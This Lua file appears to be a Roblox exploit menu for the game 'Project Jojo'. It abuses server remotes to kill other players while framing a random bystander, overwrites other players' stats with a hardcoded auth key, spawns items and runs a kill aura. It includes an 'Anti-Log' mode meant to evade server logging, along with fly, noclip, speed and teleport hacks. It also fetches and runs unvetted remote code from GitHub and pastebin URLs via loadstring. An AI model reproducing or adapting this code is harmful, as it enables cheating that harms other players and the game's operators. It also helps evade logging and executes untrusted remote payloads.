local workspace = workspace
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local LP = Players.LocalPlayer
local hitboxRemote = ReplicatedStorage:WaitForChild("Logic"):WaitForChild("hitbox")
local miscRemote = ReplicatedStorage:WaitForChild("Logic"):WaitForChild("misc")
local giveItemRemote = ReplicatedStorage:WaitForChild("Logic"):WaitForChild("giveitem")


local DAMAGE_VALUE = 2e8
local AUTH_KEY = "zxck0d929easjdkadasdji29e9u2es21"
local UI_VALUE = "UI"


local OverHeavenLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/Pedalkis123/UISMAX/refs/heads/main/UI.lua"))()


local Window = OverHeavenLib:MakeWindow({
    Name = "Updated Project Jojo GUI",
    IntroEnabled = false
})


local CombatTab = Window:MakeTab({
    Name = "Combat",
    Icon = "rbxassetid://4483345998"
})

local ItemsTab = Window:MakeTab({
    Name = "Items",
    Icon = "rbxassetid://4483345998"
})

local MovementTab = Window:MakeTab({
    Name = "Movement",
    Icon = "rbxassetid://4483345998"
})

local MiscTab = Window:MakeTab({
    Name = "Misc",
    Icon = "rbxassetid://4483345998"
})

local PlayerTab = Window:MakeTab({
    Name = "Player", 
    Icon = "rbxassetid://4483345998"
})

local TeleportsTab = Window:MakeTab({
    Name = "Teleports",
    Icon = "rbxassetid://4483345998"
})

local WorldsTab = Window:MakeTab({
    Name = "Worlds",
    Icon = "rbxassetid://4483345998"
})


local CombatSection = CombatTab:AddSection({
    Name = "Combat Features"
})


local damageEnabled = false


local function damageCharacter(character)
    if not damageEnabled then return end
    
    if character and character:FindFirstChildOfClass("Humanoid") and character.Name ~= LP.Name then
        local playerPart = LP.Character:FindFirstChildOfClass("Part")
        
        
        local allPlayers = Players:GetPlayers()
        local potentialSpoofs = {}
        
        for _, player in ipairs(allPlayers) do
            if player.Name ~= LP.Name and player.Name ~= character.Name and player.Character and player.Character:FindFirstChild("Torso") then
                table.insert(potentialSpoofs, player)
            end
        end
        
        
        local spoofPlayer = LP
        if #potentialSpoofs > 0 then
            spoofPlayer = potentialSpoofs[math.random(1, #potentialSpoofs)]
        end
        
        
        local randomDamage = math.random(10000, 50000)
        
        if playerPart then
            
            hitboxRemote:InvokeServer(0, 
                                      spoofPlayer.Character:FindFirstChildOfClass("Part"), 
                                      playerPart.CFrame, 
                                      randomDamage, 
                                      spoofPlayer.Character.Torso.voiceline, 
                                      character:FindFirstChildOfClass("Humanoid"))
        end
    end
end


local function modifyPlayerStats(player)
    if not damageEnabled then return end
    
    
    local valueToUse = antiLogEnabled and math.random(5000, 10000) or DAMAGE_VALUE
    local keyToUse = antiLogEnabled and "modified_key_" .. tostring(math.random(1000, 9999)) or AUTH_KEY
    
    local statsToChange = {
        "S/Level", "Level", "Speed", "S/Speed", "Power", "S/Power", 
        "Points", "S/Points", "Special", "S/Special"
    }
    
    for _, stat in ipairs(statsToChange) do
        miscRemote:FireServer(10, player[stat], valueToUse, keyToUse)
    end
    
    
    local standValue = antiLogEnabled and "random_stand_" .. tostring(math.random(1, 99)) or UI_VALUE
    miscRemote:FireServer(10, player["Stand"], standValue, keyToUse)
    miscRemote:FireServer(10, player["S/Stand"], standValue, keyToUse)
end


CombatSection:AddToggle({
    Name = "Instant Kill",
    Default = false,
    Callback = function(Value)
        damageEnabled = Value
        
        if Value then
            
            for _, character in ipairs(workspace:GetChildren()) do
                if character:FindFirstChildOfClass("Humanoid") and character.Name ~= LP.Name then
                    task.spawn(damageCharacter, character)
                end
            end
            
            
            for _, player in ipairs(Players:GetPlayers()) do
                modifyPlayerStats(player)
            end
        end
    end
})


workspace.ChildAdded:Connect(function(character)
    task.wait(0.125)
    if character:FindFirstChildOfClass("Humanoid") and character.Name ~= LP.Name then
        task.spawn(function()
            repeat task.wait(0.75) until not character:FindFirstChildOfClass("ForceField")
            damageCharacter(character)
        end)
    end
end)


local ItemsSection = ItemsTab:AddSection({
    Name = "Item Giver"
})

local itemAmount = 1


local function giveItem(itemName)
    for i = 1, itemAmount do
        giveItemRemote:FireServer(itemName)
        task.wait(0.1) 
    end
end


ItemsSection:AddTextbox({
    Name = "Amount",
    Default = "1",
    TextDisappear = false,
    Callback = function(Value)
        itemAmount = tonumber(Value) or 1
    end
})


ItemsSection:AddButton({
    Name = "Give Arrow",
    Callback = function()
        giveItem("StandArrow")
    end
})

ItemsSection:AddButton({
    Name = "Give Roka",
    Callback = function()
        giveItem("RokakakaFruit")
    end
})


local MovementSection = MovementTab:AddSection({
    Name = "Movement Controls"
})


local speedEnabled = false
local speedValue = 100
local speedMethod = "Default" 

MovementSection:AddSlider({
    Name = "Speed Value",
    Min = 16,
    Max = 500,
    Default = 100,
    Color = Color3.fromRGB(0, 120, 255),
    Increment = 1,
    ValueName = "Speed",
    Callback = function(Value)
        speedValue = Value
        if speedEnabled and LP.Character then
            
            applySpeedHack()
        end
    end
})

MovementSection:AddDropdown({
    Name = "Speed Method",
    Default = "Default",
    Options = {"Default", "CFrame", "Velocity"},
    Callback = function(Value)
        speedMethod = Value
        if speedEnabled and LP.Character then
            
            applySpeedHack()
        end
    end
})


function applySpeedHack()
    local character = LP.Character
    if not character then return end
    
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    local hrp = character:FindFirstChild("HumanoidRootPart")
    
    if not humanoid or not hrp then return end
    
    if speedMethod == "Default" then
        
        humanoid.WalkSpeed = speedEnabled and speedValue or 16
    elseif speedMethod == "CFrame" and speedEnabled then
        
    elseif speedMethod == "Velocity" and speedEnabled then
        
    end
end

MovementSection:AddToggle({
    Name = "Speed Hack",
    Default = false,
    Callback = function(Value)
        speedEnabled = Value
        applySpeedHack()
    end
})


local jumpEnabled = false
local infiniteJumpEnabled = false
local jumpValue = 100
local jumpMethod = "Default" 

MovementSection:AddSlider({
    Name = "Jump Power",
    Min = 50,
    Max = 500,
    Default = 100,
    Color = Color3.fromRGB(0, 255, 128),
    Increment = 1,
    ValueName = "Power",
    Callback = function(Value)
        jumpValue = Value
        if jumpEnabled and LP.Character then
            applyJumpHack()
        end
    end
})

MovementSection:AddDropdown({
    Name = "Jump Method",
    Default = "Default",
    Options = {"Default", "ForceJump", "Impulse"},
    Callback = function(Value)
        jumpMethod = Value
        if jumpEnabled and LP.Character then
            applyJumpHack()
        end
    end
})


function applyJumpHack()
    local character = LP.Character
    if not character then return end
    
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    local hrp = character:FindFirstChild("HumanoidRootPart")
    
    if not humanoid or not hrp then return end
    
    if jumpMethod == "Default" then
        
        humanoid.JumpPower = jumpEnabled and jumpValue or 50
    elseif jumpMethod == "ForceJump" or jumpMethod == "Impulse" then
        
        humanoid.JumpPower = 50 
    end
end

MovementSection:AddToggle({
    Name = "Jump Hack",
    Default = false,
    Callback = function(Value)
        jumpEnabled = Value
        applyJumpHack()
    end
})

MovementSection:AddToggle({
    Name = "Infinite Jump",
    Default = false,
    Callback = function(Value)
        infiniteJumpEnabled = Value
    end
})


UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if input.KeyCode == Enum.KeyCode.Space then
        local character = LP.Character
        if not character then return end
        
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        local hrp = character:FindFirstChild("HumanoidRootPart")
        
        if not humanoid or not hrp then return end
        
        
        if infiniteJumpEnabled then
            humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
        end
        
        
        if jumpEnabled and (jumpMethod == "ForceJump" or jumpMethod == "Impulse") then
            if jumpMethod == "ForceJump" then
                humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
            elseif jumpMethod == "Impulse" then
                hrp.Velocity = Vector3.new(hrp.Velocity.X, jumpValue, hrp.Velocity.Z)
            end
        end
    elseif input.KeyCode == Enum.KeyCode.RightControl then
        if game.CoreGui:FindFirstChild("OverHeavenLib") then
            game.CoreGui.OverHeavenLib.MainFrame.Visible = not game.CoreGui.OverHeavenLib.MainFrame.Visible
        end
    end
end)


local FlySection = MovementTab:AddSection({
    Name = "Advanced Flight"
})


local flyEnabled = false
local flySpeed = 2
local flyConnection = nil
local gravityConnection = nil

FlySection:AddSlider({
    Name = "Flight Speed",
    Min = 1,
    Max = 10,
    Default = 2,
    Color = Color3.fromRGB(255, 128, 0),
    Increment = 0.1,
    ValueName = "Speed",
    Callback = function(Value)
        flySpeed = Value
    end
})


function stopFlying()
    
    if flyConnection then
        flyConnection:Disconnect()
        flyConnection = nil
    end
    
    if gravityConnection then
        gravityConnection:Disconnect()
        gravityConnection = nil
    end
    
    
    pcall(function()
        workspace.Gravity = 196.2
    end)
    
    
    pcall(function()
        local character = LP.Character
        if not character then return end
        
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            humanoid.PlatformStand = false
        end
        
        local hrp = character:FindFirstChild("HumanoidRootPart")
        if hrp then
            
            hrp.Velocity = Vector3.new(hrp.Velocity.X * 0.5, 0, hrp.Velocity.Z * 0.5)
        end
    end)
end


function startFlying()
    
    stopFlying()
    
    
    local character = LP.Character
    if not character then return end
    
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    local hrp = character:FindFirstChild("HumanoidRootPart")
    
    if not humanoid or not hrp then return end
    
    
    workspace.Gravity = 0
    
    
    gravityConnection = RunService.Heartbeat:Connect(function()
        if not flyEnabled then return end
        
        
        if hrp and hrp:IsDescendantOf(workspace) then
            hrp.Velocity = Vector3.new(hrp.Velocity.X, 0, hrp.Velocity.Z)
        else
            stopFlying()
        end
    end)
    
    
    flyConnection = RunService.Heartbeat:Connect(function()
        if not flyEnabled then
            stopFlying()
            return
        end
        
        
        character = LP.Character
        if not character or not character:IsDescendantOf(workspace) then
            stopFlying()
            return
        end
        
        humanoid = character:FindFirstChildOfClass("Humanoid")
        hrp = character:FindFirstChild("HumanoidRootPart")
        
        if not humanoid or not hrp then
            stopFlying()
            return
        end
        
        
        local camera = workspace.CurrentCamera
        local lookVector = camera.CFrame.LookVector
        local rightVector = camera.CFrame.RightVector
        
        
        local moveVector = Vector3.new(0, 0, 0)
        
        
        pcall(function()
            if UserInputService:IsKeyDown(Enum.KeyCode.W) then
                
                local flatLook = Vector3.new(lookVector.X, 0, lookVector.Z).Unit
                moveVector = moveVector + flatLook
            end
            
            if UserInputService:IsKeyDown(Enum.KeyCode.S) then
                
                local flatLook = Vector3.new(lookVector.X, 0, lookVector.Z).Unit
                moveVector = moveVector - flatLook
            end
            
            if UserInputService:IsKeyDown(Enum.KeyCode.A) then
                
                local flatRight = Vector3.new(rightVector.X, 0, rightVector.Z).Unit
                moveVector = moveVector - flatRight
            end
            
            if UserInputService:IsKeyDown(Enum.KeyCode.D) then
                
                local flatRight = Vector3.new(rightVector.X, 0, rightVector.Z).Unit
                moveVector = moveVector + flatRight
            end
            
            
            if moveVector.Magnitude > 0 then
                moveVector = moveVector.Unit * (flySpeed * 25)
            end
            
            
            local verticalMovement = 0
            if UserInputService:IsKeyDown(Enum.KeyCode.Space) then
                verticalMovement = flySpeed * 25
            end
            if UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then
                verticalMovement = -flySpeed * 25
            end
            
            
            hrp.Velocity = Vector3.new(
                moveVector.X, 
                verticalMovement,
                moveVector.Z
            )
        end)
    end)
end

FlySection:AddToggle({
    Name = "Flight",
    Default = false,
    Callback = function(Value)
        flyEnabled = Value
        
        if Value then
            startFlying()
        else
            stopFlying()
        end
    end
})


local noclipEnabled = false
local noclipConnection = nil


function applyNoclip()
    if noclipConnection then
        noclipConnection:Disconnect()
        noclipConnection = nil
    end
    
    if noclipEnabled then
        noclipConnection = RunService.Heartbeat:Connect(function()
            local character = LP.Character
            if not character then return end
            
            for _, part in pairs(character:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.CanCollide = false
                end
            end
        end)
    end
end

MovementSection:AddToggle({
    Name = "Noclip",
    Default = false,
    Callback = function(Value)
        noclipEnabled = Value
        applyNoclip()
    end
})


RunService.Heartbeat:Connect(function()
    local character = LP.Character
    if not character then return end
    
    local hrp = character:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    
    
    if speedEnabled and speedMethod ~= "Default" then
        if speedMethod == "CFrame" then
            
            local moveDir = Vector3.new(0, 0, 0)
            local humanoid = character:FindFirstChildOfClass("Humanoid")
            
            if humanoid and humanoid.MoveDirection.Magnitude > 0 then
                local multiplier = speedValue / 16 
                hrp.CFrame = hrp.CFrame + (humanoid.MoveDirection * multiplier * 0.12)
            end
        end
    end
end)


LP.CharacterAdded:Connect(function(character)
    task.wait(1)
    
    
    if speedEnabled then
        applySpeedHack()
    end
    
    if jumpEnabled then
        applyJumpHack()
    end
    
    if flyEnabled then
        stopFlying() 
        startFlying() 
    end
    
    if noclipEnabled then
        applyNoclip()
    end
end)


local MiscSection = MiscTab:AddSection({
    Name = "Miscellaneous"
})


local itemTeleportEnabled = false
local itemTeleportConnection = nil

MiscSection:AddToggle({
    Name = "Teleport All Items",
    Default = false,
    Callback = function(Value)
        itemTeleportEnabled = Value
        
        if Value then
            if itemTeleportConnection then
                itemTeleportConnection:Disconnect()
                itemTeleportConnection = nil
            end
            
            itemTeleportConnection = RunService.Heartbeat:Connect(function()
                if not itemTeleportEnabled then
                    if itemTeleportConnection then
                        itemTeleportConnection:Disconnect()
                        itemTeleportConnection = nil
                    end
                    return
                end
                
                for _, v in pairs(workspace:GetChildren()) do
                    if v:IsA("Tool") and v:FindFirstChild("Handle") then
                        if LP.Character and LP.Character:FindFirstChild("HumanoidRootPart") then
                            v.Handle.CFrame = LP.Character.HumanoidRootPart.CFrame
                        end
                    end
                end
                
                task.wait(3) 
            end)
        else
            if itemTeleportConnection then
                itemTeleportConnection:Disconnect()
                itemTeleportConnection = nil
            end
        end
    end
})

MiscSection:AddButton({
    Name = "Look at player's stats",
    Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/vwbxDc0u"))()
    end
})


OverHeavenLib:MakeNotification({
    Name = "Project Jojo",
    Content = "Pishki s oriz",
    Time = 5
})


local BypassSection = CombatTab:AddSection({
    Name = "Anti-Log"
})


local antiLogEnabled = true 

BypassSection:AddToggle({
    Name = "Anti-Log Protection",
    Default = true,
    Callback = function(Value)
        antiLogEnabled = Value
        
        if Value then
            OverHeavenLib:MakeNotification({
                Name = "Anti-Log",
                Content = "spira loga",
                Time = 5
            })
        else
            OverHeavenLib:MakeNotification({
                Name = "Anti log",
                Content = "spira loga",
                Time = 5
            })
        end
    end
})

-- Add Player functionality
local PlayerSection = PlayerTab:AddSection({
    Name = "Player Stats"
})

PlayerSection:AddTextbox({
    Name = "Stand Power",
    Default = "",
    TextDisappear = false,
    Placeholder = "Type here!",
    Callback = function(Value)
        game.Players.LocalPlayer.Power.Value = Value
        game.Players.LocalPlayer.PowerStat.Value = Value
    end
})

PlayerSection:AddTextbox({
    Name = "Endurance",
    Default = "",
    TextDisappear = false,
    Placeholder = "Type here!",
    Callback = function(Value)
        game.Players.LocalPlayer.Endurance.Value = Value
        game.Players.LocalPlayer.EnduranceStat.Value = Value
    end
})

PlayerSection:AddTextbox({
    Name = "Special Stat",
    Default = "",
    TextDisappear = false,
    Placeholder = "Type here!",
    Callback = function(Value)
        game.Players.LocalPlayer.Special.Value = Value
        game.Players.LocalPlayer.SpecialStat.Value = Value
    end
})

PlayerSection:AddLabel("Type Inf for infinite")

PlayerSection:AddSlider({
    Name = "Attack Speed",
    Min = 1,
    Max = 5,
    Default = 1,
    Color = Color3.fromRGB(0, 120, 255),
    Increment = 0.1,
    ValueName = "Speed",
    Callback = function(Value)
        game.Players.LocalPlayer.Speed.Value = Value
    end
})

PlayerSection:AddButton({
    Name = "Open Stand Storage",
    Callback = function()
        game.Players.LocalPlayer.PlayerGui.standstore.Enabled = true
        game.Players.LocalPlayer.PlayerGui.standstore.Visible = true
    end
})

PlayerSection:AddButton({
    Name = "Open Shop",
    Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/4kPWmS7v", true))() 
    end
})

PlayerSection:AddButton({
    Name = "Kill Aura",
    Callback = function()
        local Count = 0
        while true do
            task.wait(0.2)
            local A_1 = 99999999
            local Event = game:GetService("ReplicatedStorage").Specials.throatslit
            Event:FireServer(A_1)
            Count = Count + 1
        end
    end
})

PlayerSection:AddButton({
    Name = "Do an absurd amount of damage to everything near you",
    Callback = function()
        local A_1 = 999999999999999999999999999
        local Event = game:GetService("ReplicatedStorage").Specials.throatslit
        Event:FireServer(A_1)
    end
})

-- Initialize the UI
OverHeavenLib:Init()

-- Add Teleports functionality
local ItemTP = TeleportsTab:AddSection({
    Name = "Item Teleports"
})

ItemTP:AddButton({
    Name = "Teleport to Dio's Bone",
    Callback = function()
        game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = workspace:WaitForChild("DioBone").CFrame
    end
})

ItemTP:AddButton({
    Name = "Teleport to Dio's Diary (Worthiness Version)",
    Callback = function()
        while task.wait(5) do
            for _,v in pairs(game.Workspace:GetDescendants()) do
                if string.find(v.Name, "DioDiary") and v:FindFirstChild("Handle") then
                    v:FindFirstChild("Handle").Anchored = true
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=CFrame.new(0,0,-2) * v:FindFirstChild("Handle").CFrame
                end
            end
        end
    end
})

ItemTP:AddButton({
    Name = "Teleport to Ultimate Dummy",
    Callback = function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(838.822571, 1029.94226, -1223.36951)
    end
})

ItemTP:AddButton({
    Name = "Teleport to Hyperspace Dummy",
    Callback = function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1195.75085, 1049.79041, 5.64134359)
    end
})

local QuestTP = TeleportsTab:AddSection({
    Name = "Quest Teleports"
})

QuestTP:AddButton({
    Name = "Teleport to quest: Exp is Power",
    Callback = function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1916.55969, 875.011841, -222.287766)
    end
})

QuestTP:AddButton({
    Name = "Teleport to quest: Assault On Titans",
    Callback = function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1072.45056, 875.22229, -754.062012, 0.852683008, 1.31428397e-08, -0.522428632, -3.29306005e-09, 1, 1.9782421e-08, 0.522428632, -1.51477462e-08, 0.852683008)
    end
})

QuestTP:AddButton({
    Name = "Teleport to quest: Hamon Hunt",
    Callback = function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1164.27197, 875.449097, 96.3368378, -0.985683084, -5.59815305e-08, 0.168608442, -6.32552286e-08, 1, -3.77684692e-08, -0.168608442, -4.78931099e-08, -0.985683084)
    end
})

QuestTP:AddButton({
    Name = "Teleport to quest: Vampire Hunt",
    Callback = function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1568.63184, 875.026978, -1139.93213, 0.90634042, -2.3473568e-08, -0.422548324, 1.2666816e-08, 1, -2.83828374e-08, 0.422548324, 2.03721715e-08, 0.90634042)
    end
})

QuestTP:AddButton({
    Name = "Teleport to quest: A Huge Issue",
    Callback = function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1713.60144, 874.999939, -1161.75171, 0.874661446, -2.09152944e-08, -0.484734267, -2.88108755e-08, 1, -9.51347161e-08, 0.484734267, 9.71762901e-08, 0.874661446)
    end
})

QuestTP:AddButton({
    Name = "Teleport to quest: A giant problem",
    Callback = function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1991.23816, 875, -1021.729, 0.878873348, 4.90018559e-09, -0.477055162, 1.59368856e-08, 1, 3.96320843e-08, 0.477055162, -4.24343547e-08, 0.878873348)
    end
})

QuestTP:AddButton({
    Name = "Teleport to quest: Attack on titans",
    Callback = function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(788.899292, 875.71167, -528.016968, 0.135717228, -5.74621382e-08, 0.990747631, 2.70949059e-08, 1, 5.42871774e-08, -0.990747631, 1.94765075e-08, 0.135717228)
    end
})

QuestTP:AddButton({
    Name = "Teleport to quest: The reality Warper",
    Callback = function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1138.2085, 874.999939, -168.800003, -0.983227015, -6.46937295e-08, -0.182385802, -6.85475854e-08, 1, 1.48263029e-08, 0.182385802, 2.70797287e-08, -0.983227015)
    end
})

local NPCTP = TeleportsTab:AddSection({
    Name = "NPC Teleports"
})

NPCTP:AddButton({
    Name = "Rohan",
    Callback = function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1621.55139, 875.061462, -969.720886, -0.00856200326, -2.00013144e-08, -0.999963343, 1.70892589e-09, 1, -2.00166799e-08, 0.999963343, -1.88024618e-09, -0.00856200326)
    end
})

NPCTP:AddButton({
    Name = "Jotaro",
    Callback = function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1905.40637, 875, -1295.20142, -0.898807049, 1.11613012e-08, 0.438344449, 3.67894124e-08, 1, 4.99727619e-08, -0.438344449, 6.10423072e-08, -0.898807049)
    end
})

NPCTP:AddButton({
    Name = "Stroheim",
    Callback = function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1657.61694, 875.168945, -919.496216, -0.579595625, 3.34473924e-08, -0.814904213, 3.86727272e-08, 1, 1.35388287e-08, 0.814904213, -2.36675248e-08, -0.579595625)
    end
})

NPCTP:AddButton({
    Name = "Zeppeli",
    Callback = function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Workspace["Zeppeli"].Head.CFrame
    end
})

NPCTP:AddButton({
    Name = "Caesar",
    Callback = function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Workspace["Caesar"].Head.CFrame
    end
})

local PlacesTP = TeleportsTab:AddSection({
    Name = "Places Teleports"
})

PlacesTP:AddButton({
    Name = "Teleport to shop",
    Callback = function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1518.72522, 875.027283, -425.667816)
    end
})

PlacesTP:AddButton({
    Name = "Teleport to DIO's Spawn",
    Callback = function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1361.4696, 875.011536, -200.33252, -0.999659121, 1.14996306e-08, 0.026108034, 1.44327688e-08, 1, 1.12157757e-07, -0.026108034, 1.12496338e-07, -0.999659121)
    end
})

PlacesTP:AddButton({
    Name = "Teleport to Kira's Spawn",
    Callback = function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1092.9906, 875.011597, -1060.41321, 0.917077363, -6.4417172e-08, 0.398709238, 3.527283e-08, 1, 8.04326845e-08, -0.398709238, -5.96993956e-08, 0.917077363)
    end
})

PlacesTP:AddButton({
    Name = "Teleport to Gas Station",
    Callback = function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1561.05432, 875.711853, -1121.32532)
    end
})

-- Re-initialize the UI to ensure new tab is properly rendered
OverHeavenLib:Init()

-- Add Worlds functionality
local WorldsSection = WorldsTab:AddSection({
    Name = "World Teleportation"
})

WorldsSection:AddButton({
    Name = "Go to Italy",
    Callback = function()
        game:GetService("TeleportService"):Teleport(2731332132, game.Players.LocalPlayer)
    end
})

WorldsSection:AddButton({
    Name = "Go to Morioh",
    Callback = function()
        game:GetService("TeleportService"):Teleport(2295122555, game.Players.LocalPlayer)
    end
})

-- Re-initialize the UI once more to ensure all tabs render correctly
OverHeavenLib:Init()
